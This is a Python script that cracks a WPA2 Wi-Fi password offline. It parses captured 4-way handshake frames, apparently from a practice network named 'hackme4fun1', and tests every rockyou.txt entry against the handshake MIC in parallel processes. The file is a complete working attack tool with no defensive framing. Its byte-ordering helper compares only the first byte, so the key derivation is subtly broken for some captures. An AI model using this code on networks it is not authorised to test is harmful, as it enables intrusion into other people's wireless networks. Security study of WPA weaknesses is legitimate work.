import hashlib
import hmac
from time import time
from multiprocessing import Pool, cpu_count
import functools
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


def crack_wpa_p(message, eapol_frame_zeroed_mic, mic, ssid_bytes, password_guess):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=32,
        salt=ssid_bytes,
        iterations=4096
    )
    pmk = kdf.derive(password_guess)
    # pmk = hashlib.pbkdf2_hmac('sha1', password_guess, ssid_bytes, 4096, 32)
    kck = hmac.digest(pmk, message+b'\0', hashlib.sha1)[:16]
    if hmac.compare_digest(mic, hmac.digest(kck, eapol_frame_zeroed_mic, hashlib.sha1)[:16]):
        print(f'Found password: {password_guess.decode("utf-8")}')
        return 0


def main():
    with open('rockyou.txt', 'rb') as fp:
        password_list = fp.read().splitlines()

    t0 = time()

    # Replace with your own values
    FRAME_1 = bytes.fromhex('88023a019cb6d0fc90c77c8bcacbd7827c8bcacbd78200000000aaaa03000000888e0103005f02008a001000000000000000011a8b4e106c75287aa6d52dbc8342306e2f4f77e3826556a482bcd5f72c97e0f60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
    FRAME_2 = bytes.fromhex('88013a017c8bcacbd7829cb6d0fc90c77c8bcacbd78200000600aaaa03000000888e0103007502010a0000000000000000000103864225e34350a84df0061bb6ae60da4c0600879d50ec1ea4f47ee29da4b5da0000000000000000000000000000000000000000000000000000000000000000584c33e052eb53dd19001a339b42eefe001630140100000fac040100000fac040100000fac020000')
    SSID = 'hackme4fun1'
    SSID_BYTES = SSID.encode()

    BEACON_FRAME = b'\x80\x00'
    ASSOCIATION_RESP_FRAME = b'\x10\x00'
    HANDSHAKE_AP_FRAME = b'\x88\x02'
    HANDSHAKE_STA_FRAME = b'\x88\x01'

    association_init = True
    handshake_counter = 0

    ap_mac = FRAME_1[10:16]
    sta_mac = FRAME_1[4:10]
    ap_nonce = FRAME_1[51:83]
    sta_nonce = FRAME_2[51:83]

    def sort(in_1, in_2):
        in_1_byte_list = list(bytes(in_1))
        in_2_byte_list = list(bytes(in_2))

        for i in range(0, len(in_1_byte_list)):
            if in_1_byte_list[i] < in_2_byte_list[i]:
                return (in_2, in_1)
            else:
                return (in_1, in_2)

    max_mac, min_mac = sort(ap_mac, sta_mac)
    max_nonce, min_nonce = sort(ap_nonce, sta_nonce)

    message = b''.join([
        b'Pairwise key expansion\x00',
        min_mac,
        max_mac,
        min_nonce,
        max_nonce
    ])
    packet = FRAME_2
    frame_ctl = packet[0:2]
    duration = packet[2:4]
    address_1 = packet[4:10]
    address_2 = packet[10:16]
    address_3 = packet[16:22]
    sequence_control = packet[22:24]
    address_4 = packet[24:30]
    payload = packet[30:]
    crc = packet[-4:]
    eapol_frame = payload[4:]
    version = eapol_frame[0]
    eapol_frame_type = eapol_frame[1]
    body_length = eapol_frame[2:4]
    key_type = eapol_frame[4]
    key_info = eapol_frame[5:7]
    key_length = eapol_frame[7:9]
    replay_counter = eapol_frame[9:17]
    nonce = eapol_frame[17:49]
    key_iv = eapol_frame[49:65]
    key_rsc = eapol_frame[65:73]
    key_id = eapol_frame[73:81]
    mic = eapol_frame[81:97]
    wpa_key_length = eapol_frame[97:99]
    wpa_key = eapol_frame[99:]
    eapol_frame_zeroed_mic = b''.join([
        eapol_frame[:81],
        b'\0' * 16,
        eapol_frame[97:]
    ])
    len_password_list = len(password_list)
    core_count = cpu_count()
    chunck_size = 2000
    len_section = chunck_size * core_count
    num_section = len_password_list // len_section
    idx_section = 0
    print(f'Spawning {core_count} processes...')
    with Pool(processes=core_count) as pool:
        for idx_section in range(num_section):
            if 0 in pool.imap_unordered(functools.partial(crack_wpa_p, message, eapol_frame_zeroed_mic, mic, SSID_BYTES), password_list[idx_section*len_section:(idx_section+1)*len_section]):
                print(f'Spent {time()-t0:.2f}s')
                exit()
        else:
            return_values = pool.imap_unordered(functools.partial(
                crack_wpa_p, message, eapol_frame_zeroed_mic, mic, SSID_BYTES), password_list[idx_section*len_section:])
            if 0 in return_values:
                print(f'Spent {time()-t0:.2f}s')
                exit()
            print(f'Spent {time()-t0:.2f}s')


if __name__ == '__main__':
    main()
